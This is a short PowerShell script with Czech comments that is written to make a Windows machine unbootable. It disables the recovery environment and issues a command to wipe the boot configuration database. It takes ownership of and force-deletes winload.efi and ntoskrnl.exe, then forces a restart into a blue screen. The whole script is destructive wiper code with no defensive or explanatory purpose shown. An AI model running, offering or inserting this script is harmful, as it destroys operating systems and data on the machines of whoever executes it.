# Vypnutí prostředí automatické obnovy
reagentc /disable

# Vymazání bootovací databáze BCD
bcdedit /clean

# Cesty k dalším kritickým souborům
$files = @(
    "C:\Windows\System32\winload.efi",
    "C:\Windows\System32\ntoskrnl.exe"
)

# Smyčka pro převzetí práv a smazání všech definovaných souborů
foreach ($file in $files) {
    if (Test-Path $file) {
        takeown /f $file /a
        icacls $file /grant administrators:F
        Remove-Item $file -Force
    }
}

Write-Host "Systémové soubory a BCD byly odstraněny. Počítač se restartuje do BSOD." -ForegroundColor Red
Read-Host "Stiskněte Enter pro vynucený restart..."
Restart-Computer -Force
